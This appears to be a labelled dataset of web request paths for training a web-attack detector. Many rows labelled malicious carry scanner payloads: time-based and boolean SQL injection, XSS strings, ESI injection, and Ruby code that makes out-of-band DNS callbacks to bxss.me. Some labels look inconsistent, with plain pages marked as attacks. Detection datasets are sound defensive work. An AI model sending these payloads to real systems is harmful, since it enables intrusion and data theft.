request	label
/******/resource/if(now()=sysdate(),sleep(12),0)/vsb_news_search_entry.js	1
/*******/anjg.php	1
/****/jtdt/jt16/201609/t20160920_102155.html' and 'x'='x	1
/**********/system/2021/11/27/013486690.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6bdb\u8bb0\u5192\u83dc\u9986	0
/**********/system/2021/12/19/013496553.shtml	0
/************/template/jcse//xfs.bxss.me/16/images/plugin/hotnews/js.js	1
/***/0/01/14/11/1141199_971485.jpg	0
/******/hbdc/bg/	0
/****/czgk/bmjs/zzqjcyxt/plxrmjcy/201805/t20180524_765571.html	0
/*****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/****/gjzqq/index.html?continent=%' and 6802=6802 and '%%'='%	1
/****/system/2009/06/04/002750667.shtml	0
/***/0/00/34/40/344097_072487.png	0
/****/web/search?channelid=299868&perpage=1000') or 0609=0609	1
/****/wdsjs/hfswsj/202107/t20210704_184242.html	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/******/index.html"	1
"/****/xxgkml/zfczyjs/list.html?new=' 'a'.concat(70-3).concat(22*4).concat(104).concat(69).concat(97).concat(72) (require'socket'
socket.gethostbyname('hitpb' 'tocrydvre7a5d.bxss.me.')[3].to_s) '"	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\u0278\u0273\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7231\u8d1d\u513f\u517b\u751f\u9986	0
/****/20200622/e102627076.html	0
/******/jslib/grouppic/http://bxss.me/t/xss.html?	1
/****/web/search?channelid=254846') and 8420=2622 and ('ncbh'='ncbh&searchword=天津	1
"/******/20190808.swf/""><script>alert(183)</script>"	1
"/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
/*****/system/2011/03/24/010320504.shtml	0
/****/byszf/sz/202108/t20210806_185416.html?leader=bxss.me/t/xss.html?	1
/****/xqdt/jtx/201610/t20161025_44158.html	0
/****/2013/07/1853.html	0
/******/usercenter/index?qrcode=quicklyrq,3,151620,17623&code=011y8r0006lezm189q300byl8g3y8r0-	0
/******/20210125/2277.html	0
/******/resource/if(now()=sysdate(),sleep(12),0)/ajax.js	1
/**/ui/lib/easyui/http://bxss.me/t/fit.txt?.jpg/jquery.parser.js	1
/**********/system/2018/06/22/012639055.shtml	1
"/**********/index.php?rt=product/manufacturer&manufacturer_id=15""><script>alert(777);</script>"	1
/****/rsgzxx/if(now()=sysdate(),sleep(12),0).htm	1
/****/web/search?page=213&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/******/nxslh-icon-line-left.png	0
/****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/xwdt'||'/****/zjdt/gzdt/145.htm	1
/****/zxft/202102/t20210204_2592647.html	0
/*****/system/2019/09/20/javascript:window.print()	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqwsg/201702/t20170208_318575.html	0
/****/qyzdsx/201911/t20191105_225767.html	1
/****/20200807/e104702683.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u8bda\u6d01\u5bb6\u653f\u670d\u52a1\u90e8	0
/zwxx_11337/****/201902/t20190215_1279616.html	0
/****/20200616/e102373273.html	0
/****/system/2021/12/20/013496981.shtml	0
/****/201909/t20190926_1757115.html	0
/****/jtdt/2021_jtyw/202106/w020210629368401570089.jpg	0
/zwgk'||'/******/ncwywfgz/1.htm	1
/*****/gy42/ljcpgyview.asp?id=29721367&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/zwxx_11337/****/202003/t20200326_2003020.html	0
/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=1&i_webid=1&type=1&url[0]=extractvalue(1,concat(char(126),md5(1211761572)))&url[1]==1	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u7ea2\u5bfa\u5821\u533a\u9e4f\u7a0b\u9884\u5236\u5382	0
/**//845/4gabdx2y/xhr_send?t=1632400431356	1
/**********/system/2021/10/25/013469792.shtml	0
/****/gjzqq/fz/jbbw/201412/w020141212375146348792.jpg	0
"/****/ssgs/gtgy//*/-->'""""></iframe></script></style></title></textarea><script >alert(23517)</script>"	1
/*******/qiye/e141722899.html	0
/********/fortunewheel/wechat/callback?code=0117i2ll2l8ck841yqol2hz8li07i2lp&state=ce7f4ce3ae9342bb87643f62f914a6a4	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u91d1\u76fe\u9632\u6c34\u6750\u6599\u7ecf\u9500\u90e8	0
/******/414/yj/	0
/******/system/2017/10/25/012451055.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u6c81\u9759\u7ae5\u88c5\u5e97	0
/******/_content/download.jsp?urltype=news.downloadattachurl' and 9055=4591	1
/**********/system/2016/10/13/012159460.shtml	0
/*****/mswpmm/common/signin.aspx?btnsignin=alert(777)returnurl=/mswpmm/common/default.aspx	1
/ztzl'||'/******/ywdt.htm	1
/****/czgk/bmyjs/zzqjcyxt/zzqgjzzqtljcy_1818/202002/t20200210_1949202.html	0
/****/jtdt/jt17_6388/index_16.html	0
"/************/common-problem/jyxg/2017-02-0""""xor(if(now()=sysdate(),sleep(14),0))xor""""z/406.html"	1
/****/web/search?page=2&channelid=253477&searchword=1%' and 4303=7909 and '%%'='%&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/***/0/01/30/03/1300352_948220.jpg	0
/****/web/search?channelid=299868&perpage=1000%') or 4388=4388 /*	1
/****/czgk/bmjs/zzqfyxt/ynxrmfy/202108/t20210818_2979500.html	0
/************//xfs.bxss.me/jcse/110105008056111/16/images/plugin/selectpick/css.css	1
/******/n42821/n42825/n1588869'||'/c1589229/content.html	1
/****/html/demo1'||'.html	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(117).concat(69).concat(103).concat(77) (require""""socket""""
socket.gethostbyname(""""hitji"""" """"fwifazxw64e81.bxss.me."""")[3].to_s) """"/********/jcse/website.js"	1
/****/zbyfyzz/cpyz/201412/w020141226596810335737.jpg	0
/***/003/003/508/00300350865_897ba780.jpg	0
/**********/system/2020/03/27/013126628.shtml	0
/****/zhengce/zfwjn/201801/w020180116807219009201.jpg	0
/****/czgk/bmjs/sydw1/zfzshbsc/201609/t20160923_317998.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5f66\u82b1\u767e\u8d27\u95e8\u5e02\u90e8	0
/***/0/02/06/27/2062705_327538.jpg	0
/******/usercenter/index?qrcode=73122	0
/****/shzr/cxgj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/*****/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""""/>alert(777);?tested=1"	1
/****/gjdjbn/djbn_jthd/202110/t20211029_319772.html	0
/*******/qiye/b-e762361.html	0
/****/xwpwmfz/ztxw/201903/t20190328_206031.html	0
/****/system/2020/09/07/013242114.shtml	0
/****************/notification/negotiate?access_token=79c6409d-da8c-4da7-a8bc-571514016665	0
/*****/system/2015/04/22/011696686_01.shtml	0
/****/web/search?page=258&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5b8f\u9526\u8fdc\u6c7d\u4fee\u90e8	0
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!--	1
"/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new=0.24997914938407995<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u6d0b\u9a6c\u94c3\u85af\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/jwmsxf/package/swiper-bundle.min.css	0
/col'||'/*****/index.html	1
/****/zdgz/2020_zdgz/202011/w020201127212936201230.jpg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery111108384146587100816_1639991261561	0
/****/bmkx/sfgw/201610/t20161025_14216.html	0
/****/web/search/search?page=3&channelid=287219&searchword=1 and 3586=7800-- pruj&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10	1
/****/bmkx/sfgw/201706/t20170602_90835.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u8d75\u7ea2\u6e2f\u725b\u8089\u9762\u9986	0
/***/viewspace-785.html	0
/**********/system/2015/11/13/011864147.shtml	1
"/****/qzfwj/202104/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19105367142125383793_1639991340195	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtigp0def7ycm90iqbqu82o8=&openid=ovl7jjnzsabq-couwzbhm94z-npw&outer_str=9150&activate_ticket=fdzv9emqaffrnr3xboqhb1yaepq7rcrhq0obhbta0c0itclsq4mhjtjo4oftfzx5qdcfrfcrz3fu9k2h4roelucqskcbwitr2nd7qwooqzy=	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u51b0\u71d5\u513f\u7bb1\u5305\u5e97	0
"/***/col31/index.html/<img src=""javascript:alert(772)"">"	1
/*******/qiye/b-e2456996.html	0
/***/col412/index.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' and 9134=4960 and '%'='	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u7f8e\u59ae\u5b50\u5973\u88c5\u5e97	0
/zwxx_11337/****/zcjd/index_11.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u946b\u946b\u4e07\u5bb6\u4fbf\u5229\u5e97	0
/*******/m89atz.php	1
/****/jtdj/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
"/****/byszf/sz'""""()&%<acx><script >aavn(9721)</script>/202108/t20210806_185416.html"	1
/*******/qiye/e142875566.html	0
/****/0816/218822.shtml	0
/****/crt/ldhd/	0
/****/bmkx/snmj/201909/t20190927_142656_wap.html	0
/****/bygk/zrdl/201907/t20190719_140086_wap.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u4e2d\u6d69\u8d27\u8fd0\u90e8	0
/******/icon8.png	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12010,""place_id"":""fm_sp_ard"",""news_id"":""242509""}"	0
/******/resource/code/datainput.jsp?e=1&pagename=l2luzgv4lmpzca==&h=0&newsid=-1&treeid=1001&w=0&owner= /v8apa-script ad4-alert(/xss/) adw-/script ad4-&refer=	1
"/****/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/*****/system/2021/12/07/javascript:window.close();	1
/*******/qiye/giruvj_e144542364.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u96ea\u6885\u6728\u4e1a\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9752\u9547\u78ca\u78ca\u9ebb\u8fa3\u70eb\u5e97	0
/****/system/2017/01/27/012235148.shtml	0
/***/0/02/06/29/2062976_470038.jpg	0
/**/system/2021/04/16/012151652.shtml	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=37868	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u585e\u4e0a\u98de\u9e3f\u56fe\u6587\u5de5\u4f5c\u5ba4	0
/****/system/2020/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u6da6\u679d\u5546\u5e97	0
/**/zfxxgkjs/index.html?channelid=295157&searchword=0'xor(if(now()=sysdate(),sleep(15),0))xor'z	1
/**********/system/2020/03/23/013122555.shtml	0
/****/wdszs/hfsz/202106/t20210617_183883.html	0
"/***/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""""><script>alert(777)</script>894ba&type=&width="	1
/***/viewspace-740.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105232291668342308_1639980051019	0
/jsearchfront'||'/********/jcse/110105008056111/16/images/jquery.cookie.js	1
/****/czgk/bmjs/zzqfyxt/zzqgyzzqtlfy_1817/201611/t20161111_318406.html	0
/****/qwsearch/?searchword=\u77ff\u5c71\u6551\u62a4\u961f	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u7ea2\u5b9d\u8857\u987a\u7a0b\u6c7d\u8f66\u4fee\u7406\u90e8	0
/****/xqdt/jtx/201610/t20161025_43778_wap.html	0
"/****/zfwzjs/201903/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
"/****/qzfwj/202007/""></a>-->"	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u201c\u5feb\u5546\u52a1\u201d	0
/****/20211209/javascript:void(0);	1
/****/20210104/e113680745.html	0
/*****/gy42/ljcpgyview.asp?id=29007394&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
"/******/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/***/system/2009/03/13/002706997.shtml	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmw/201903/t20190304_1297107.html	0
/****/wdsjs/hfswsj/202011/t20201116_174107.html	0
"/*/action/showinfo/?classid=0""""xor(if(now()=sysdate(),sleep(22),0))xor""""z&id=10299"	1
/****/201909/t20190926_1756968.html	0
/****/czgk/bmjs/zzqjcyxt/hnqrmjcy/201808/t20180816_978100.html	0
/****/2020jnxc/yxzp/202006/t20200630_249612.html	0
/****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
/****/zt/hjbhdc/202005/t20200509_2075256.html	1
/****/category/kuaguobinggou?page=1 and 1158=1158	1
/*******/202006/202006091651451191.html	0
/****/system/2020/03/30/javascript:window.print()	1
/wp-content/******/peer-theme/404.php	1
/****/zgsdt/2011zgsdt/201412/t20141218_42916.html	0
"/****/zfwjn/1079/'""""()&%<acx><script >dwaj(9071)</script>/list.html"	1
/****/b-e1105655.html	0
/********/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/***/0/02/04/95/2049524_709703.png	0
/*********/javascript:;	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4f9d\u795e\u670d\u88c5\u5e72\u6d17\u5e97	0
/zwgk' and 2*3*8=6*8 and 'jehh'='jehh/******/gczlzl/1.htm	1
/****/whhd/201412/t20141218_48034.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(80).concat(104).concat(89) (require""""socket""""
socket.gethostbyname(""""hitgd"""" """"tldbxkfme9386.bxss.me."""")[3].to_s) """"_2042/list.html"	1
/****/category/fengxianfangfan?page=1 and 2387=4273	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtdywty2khqmbyknoneh qhi=&openid=ovl7jjnsxyl3k5lrmvohxhblb6qo&outer_str=83196&activate_ticket=fdzv9emqaffrnr3xboqhb ryisnnaxou900giahufodoo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlqkxa8pbp5tejdrwtwjbyew=	0
/***/scripts/ueditor/net/upload/2019-08-19/0a8a9eed-7ff3-45c3-b919-418a9aa9482a.png	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6995\u65fa\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/***/0/01/91/75/1917595_168224.png	0
/*****/gy48/cpgyss.asp?key=\u6dc4\u535a\u6613\u4e50\u9014\u6e05\u6d01\u5668\u6750\u7ecf\u8425\u90e8&l=\ufffd\ufffd\ufffd\ufffd	0
/***/2021/10/bxss.me/art_34_242318.html	1
/***/0/01/91/58/1915800_968621.jpg	0
/****/zfxxgk/fdzdgknr/lzyj/gfxwj_40892/202107/t20210712_2921082.html	0
/****/jtdt/2013jtdt/201412/t20141218_37541.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u81fb\u5c1a\u670d\u88c5\u5e97	0
/************/template/jcse/110105008056111/16/images/bxss.me/voice/hzrecorder.js	1
/**/ourbusiness/projectcontracting/201412/t20141210_22180.html and 1=1	1
"/***/main/myspace/student.php?keyword=31337"""" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search"	1
/****/qzfwj/202105/t20210510_2832756.html/index_1.html	0
/*******/qiye/b-e1847206.html	0
"/**/main/messages/outbox.php?f=social"""" onmouseover=""""confirm(777)"	1
/**/images/index.js	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u738b\u98ce\u8d35\u70df\u82b1\u7206\u7af9\u4e34\u65f6\u644a\u70b9	0
/******/wap_index.js	0
/zwxx_11337/****/202002/t20200217_1958108.html	0
/******/usercenter/index?qrcode=84578&code=011d3e000ai50n1zlg400mjhee1d3e0x	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6d9b\u6d9b\u70e7\u70e4\u5e97	0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/czjs/gzdt.htm	1
/*****/gy42/cpgyss.asp?key=\u70ed\u7ba1\u5f0f\u6362\u70ed\u5668\u7684\u5382\u914d\u4ef6\u89c4\u683c\u6807\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
/***/interface/comul_total.json.jsp?callback=jquery19105533914203577956_1640025578011	0
/***/0/02/02/48/2024849_141742.jpg	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqskylgbjdaj_1819/index_1.html	0
/***/0/01/92/96/1929652_565989.jpg	0
"/****/mydevice/loggedout.jsp?locale=""""><script>alert(777)</script>"	1
/*****/gy42/ljcpgyview.asp?id=29718688&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3f6d	0
/*******/qiye/b-e2545605.html	0
/__media__/**/netsoltrademark.php?d=blog-clip-xxx.buzz/2715	0
/****/web/search?channelid=254846&searchword=北京' && benchmark(2999999,md5(now())) order by 21	1
/****/zgsdt/2020_qydt/202008/t20200827_252514.html	0
/****/myjzgcsj/	0
/****/bygk/bygkz/202106/t20210624_184041_wap.html	0
/****/zgsdt/2021_qydt/202111/ddjs/	0
/**********/system/2021/10/19/javascript:void(0);	1
/****/zt/jczwgk/gzdt/201806/t20180630_854282.html	0
/wp-content/*******/advanced-text-widget/advancedtext.php?page=</script><script>alert(document.domain)</script>	1
"/***/getsubject?data={""subject_id"":148,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":3842,""sign"":""""}"	0
/****/zzxxgk/jjhzj/202112/t20211206_197346.html	0
/zwxx_11337/****/202103/t20210323_2634963_zzb.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\u01b7\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0525&order=1	0
/****/zzxxgk/jjhzj/gyjzq/hnx_3667/201403/t20140310_165881.html	0
/******/scy_gj_hltx_banner_zhxjtu.jpg	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4670)"">?_=1630312089646"	1
/**********/system/2021/12/14/013494432.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u4e39\u9633\u77f3\u6599\u5382	0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/lib/easyui/plugins/jquery.linkbutton.js	1
/****/template.cfm?moduletitle=alert(777)	1
/*****/?loginid=10018751&stamp=1639980599729&token=880e3b48f4347979e6a3b9419c409f04c26e797d&hrn=10018751	0
"/****/czgk/bmjs/rmtt/tw/202008/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
"/***/getsubject?data={""subject_id"":406,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":6119,""sign"":""""}"	0
/****/jtdt/2013jtdt/	0
/***/mobile_h5/waparticledetail.do?article_id=201912091525371137&contenttype=article	0
/*****/gy42/cpgyss.asp?key=\u6f4d\u574a\u9600\u95e8\u6a61\u80f6\u5236\ufffd?&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6613\u9ed1\u9e2d\u9e2d\u8116\u65b0\u534e\u8857\u5e97	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u01e7\ufffd\ufffd	0
/*****/image/2.cer	1
/*****/system/2021/05/10/javascript:window.close();	1
/***/index.php?do=post&id=442&c=dt&a=goods&	1
/******/20170907.jpg	0
/**/system/2021/12/21/012232185.shtml	0
"/****/system/2021/09/08/013447520'""/><img src=javascript:alert(1466) .shtml"	1
/*****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/**/ui/http://bxss.me/t/fit.txt/hanweb/ie6fixed/ie6fixed.js	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u56db\u6d77\u9f99\u670d\u9970\u5e97	0
/****/system/2017/02/21/javascript:dozoom(12)	1
/***/0/01/56/10/1561011_742285.jpg	0
"/****/zzxxgk/tjj/tjjysqgk/gkcx/list.html?new='""""()&%<acx><script >y6zc(9916)</script>"	1
/****/zt/nlkfxjjsyq/syqdt/201511/t20151103_330929.html	0
/******/images/jquery.js	0
/*******/3mk.php	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u65b9\u5468\u7535\u6c14\u710a\u4fee\u7406\u90e8	0
/******/usercenter/index?qrcode=41730&code=091ddzfa1he6kc01q0ja1l1r7y0ddzfi	0
/******/' u[d].src	0
/******/download/downfile.jsp?classid=0&filename=aa5b6197abf74d70b14ec83b8819378f.doc' and 3983=3983 and 'zkqs'='zkqs	1
/**********/system/2021/08/13/013434276.shtml	0
/************/template/jcse/110105008056111/16/images'||'/ui.css	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/gytdsdfwzs/wzs/zcwj.htm"	1
"/******/resource/js/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/wdatepicker.js"	1
/******/resource/pdfjs/build/fqaabdgaaaaet1mvmlynywkaaaegaaaaygntyxabdqluaaacnaaaaujozwfk/xvfdqaa/anonymous<script>alert(777)</script>test.jsp	1
/**********/system/2020/12/28/013310595.shtml	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202012/t20201211_174792.html	0
/**********/system/2021/09/18/013453738.shtml	0
/****/xxgknb/2015/201603/t20160330_75952.html	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5357\u8857\u7efc\u5408\u5546\u5e97	0
/****/n.src	0
/****/zzxxgk/jjhzj/gyjzq/gyjzq_3662/201906/t20190602_163529.html	0
/****/rwfc/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/*****/20210531/9922.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7530\u5f66\u5f3a\u7cbe\u54c1\u670d\u9970\u5e97	0
/****/czgk/bmjs/zzqfyxt/xjxrmfy/	0
/****/qzfwj/201902/p020211011377766411244.doc	0
/**********/system/2021/11/26/013486196.shtml	0
/****/bmkx/slyj/201610/t20161025_2970.html	0
/******/usercenter/index?qrcode=quicklyrq,3,134483,10634852	0
/******/site-libg.png	0
/****/sj1/tjxx/202006/w020200630375139206970.png	0
/****/55051.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u822a\u7490\u65ed\u6c34\u679c\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u51af\u6c38\u7434\u9488\u7ec7\u5e97	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19107239474900013225_1639972990237	0
"/vc<esi:include src=""""http://*******/rpb.png""""/>/vclogin.do"	1
"/****/web/search?searchword=*/-->'""""></iframe></script></style></title></textarea><script >alert(97581)</script>&channelid=287219&perpage=24&templet=1&token=1"	1
/******/visitcount/visit.jsp?type=2&i_webid=1&i_columnid=37 and 1>1	1
/****/zfwzjs/201803/t20180327_724667.html	0
/****/api/apibankaddress/querybankaddressbyid?id=130	0
"/****/admin/edit.php?menu="""">pt>alert(777); script>pt>"	1
/******/system/2007/12/17/002291761.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u4e07\u6d77\u971e\u9910\u9986	0
/zwxx_11337/****/201704/t20170428_303931.html	0
/****/2020jnxc/yxzp/202006/w020200701485151692324.jpg	0
/*****/system/2013/09/04/javascript:window.close();	1
/****/kjdt/index_3.html	0
/*******/qiye/b-e1808824.html	0
/******/usercenter/index?qrcode=37538	0
/**********/system/2020/04/18/013143577.shtml	0
/**/ui/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/validity/validity.js	1
/****/mtgz/gzxwmtgz/javascript:stranbody();	1
"/*/161208'""""()&%<acx><script >rgwb(9826)</script>-1/index/f9c9520331f04523cde0d9bda27a3001.css"	1
/**********/system/2020/12/22/013307274.shtml	0
/**********/system/2020/04/13/013138847.shtml	0
/*****/index_xczdms_jjms.html	0
/****/czgk/bmjs/zzqjcyxt/ynxrmjcy	0
/**/system/2021/01/28/javascript:void(0);	1
/**********/system/2021/10/08/javascript:void(0);	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/********/js/news/mp4video.js"	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(416)"">?_=1630311399361"	1
"/************/template/jcse/'""""()&%<acx><script >dsxv(9972)</script>/16/images/plugin/waterpull/pinterest_grid.js"	1
/*****/system/2021/12/13/javascript:void();	1
/**********/system/2020/04/27/013150068.shtml	0
/****/bmkx/jyj/201905/w020190520426704817187.jpg	0
/****/20200525/e101380622.html	0
/*******/qiye/businesses-e42579_3.html?category_id=251687	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9e3f\u8fd0\u901a\u6c7d\u8f66\u7ef4\u4fee\u5382	0
